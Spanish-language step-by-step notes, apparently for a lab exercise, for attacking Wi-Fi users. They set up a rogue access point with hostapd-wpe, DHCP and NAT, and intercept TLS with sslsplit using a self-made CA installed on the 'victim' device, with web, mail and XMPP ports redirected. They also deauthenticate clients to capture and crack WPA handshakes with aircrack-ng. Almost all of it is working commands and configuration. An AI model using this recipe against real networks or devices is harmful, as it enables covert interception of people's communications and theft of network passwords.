Teclado ES

```
setxkbmap es sundeadkeys
```

# AP

Comprobar que el dispositivo está enchufado y detectado

```
iwconfig
```

Actualizar la lista de paquetes disponibles y sus versiones

```
sudo apt update
```

Modified hostapd to facilitate AP impersonation attacks

(hostapd modificado para facilitar ataques de impersonificación en puntos de acceso)

```
sudo apt install hostapd-wpe
```

```
cd
mkdir pruebas
cd pruebas
```

```
nano host.conf
```

```
interface=wlan0
driver=nl80211
country_code=ES
hw_mode=g
channel=1
ssid=Core Free

#auth_algs=1
#wpa=2
#wpa_key_mgmt=WPA-PSK
#wpa_pairwise=CCMP
#wpa_passphrase=12345678
```

# Redirección de tráfico

```
cd
cd pruebas
```

```
touch ip.sh
chmod 700 ip.sh
nano ip.sh
```

```
#!/bin/bash

iptables -F
iptables -t nat -F

iptables -X
iptables -t nat -X

iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT

echo 1 > /proc/sys/net/ipv4/ip_forward

LAN_IF="eth0"

iptables -t nat -A POSTROUTING -o $LAN_IF -j MASQUERADE
```

# DHCP

```
sudo apt install isc-dhcp-server
sudo cp /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.ORIGINAL
sudo nano /etc/dhcp/dhcpd.conf
```

Descomentar la siguiente instruccion

```
#authoritative;
```

Añadir al final del documento

```
subnet 172.16.0.0 netmask 255.255.255.0 {
    range 172.16.0.100 172.16.0.240;
    option broadcast-address 172.16.0.255;
    option routers 172.16.0.1;
    option domain-name "local";
    option domain-name-servers 8.8.8.8, 8.8.4.4;
}
```

```
sudo nano /etc/default/isc-dhcp-server
```

Modificarlo de la siguiente forma

```
INTERFACESV4="wlan0"
# INTERFACESV6=""
```

# Iniciar

Nota: Correr en el mismo orden en caso de reiniciar el sistema

```
sudo ifconfig wlan0 172.16.0.1 netmask 255.255.255.0
sudo systemctl start isc-dhcp-server.service
sudo systemctl status isc-dhcp-server.service
```

```
cd
cd pruebas
```

```
sudo ./ip.sh
sudo iptables -t nat -nL
```

```
sudo airmon-ng check
sudo airmon-ng check kill
sudo airmon-ng check
```

```
sudo hostapd-wpe host.conf
```

# SSL

```
cd
cd pruebas
mkdir sslsplit
cd sslsplit
```

Generar el certificado. Debe ser instalado en el dispositivo de la víctima

```
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
```

Editar el script "ip.sh" que teníamos y cambiar todos los "iptables" por "iptables-legacy", entonces quedaría:

```
#!/bin/bash

iptables-legacy -F
iptables-legacy -t nat -F

iptables-legacy -X
iptables-legacy -t nat -X

iptables-legacy -P INPUT ACCEPT
iptables-legacy -P OUTPUT ACCEPT
iptables-legacy -P FORWARD ACCEPT

echo 1 > /proc/sys/net/ipv4/ip_forward

LAN_IF="eth0"

iptables-legacy -t nat -A POSTROUTING -o $LAN_IF -j MASQUERADE
```

Y debajo añadir las siguientes reglas

```
iptables-legacy -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables-legacy -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
iptables-legacy -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443
iptables-legacy -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443
iptables-legacy -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443
iptables-legacy -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080
```

Cuando se haya lanzado el ip.sh, comprobarlo con

```
sudo iptables-legacy -t nat -nL
```

en lugar de con

```
sudo iptables -t nat -nL
```

```
cd
cd pruebas/sslsplit
mkdir logdir
mkdir /tmp/sslsplit
```

```
sudo sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080
o
sudo sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt https 0.0.0.0 8443 tcp 0.0.0.0 8080
```

# Crack

Comprobar que el device ha sido detectado

```
iwconfig
```

```
sudo airmon-ng check
sudo airmon-ng check kill
sudo airmon-ng check
```

Comprobar wlan0 se ha convertido en wlan0mon

```
sudo airmon-ng start wlan0
iwconfig
```

```
sudo airodump-ng wlan0mon
coger el bssid y el canal para hacerlo más especifico:
cd
cd Desktop
sudo airodump-ng -c [canal del punto de acceso] -bssid [bssid del punto de acceso] -w objetivo wlan0mon
(en STATION coger la mac address del dispositivo que está conectado al punto de acceso. Se crearan algunos archivos llamados objetivo, entre ellos un .cap)

sudo aireplay-ng -0 5 -a [bssid del punto de acceso] -c [mac address del dispositivo que está conectado al punto de acceso] wlan0mon
tiene que mostrar algunas lineas de "Sending" y en el airodump-ng mostrarse el "handshake"

cd
cd Desktop
crear un contrasenas.txt con contraseñas (incluir la contraseña buena)
sudo aircrack-ng -w contrasenas.txt [el archivo .cap]
Se debe mostrar "KEY FOUND" y a continuación la contraseña
```

# Enlaces

```
https://blog.heckel.io/2013/08/04/use-sslsplit-to-transparently-sniff-tls-ssl-connections/

https://alpaca-attack.com/
```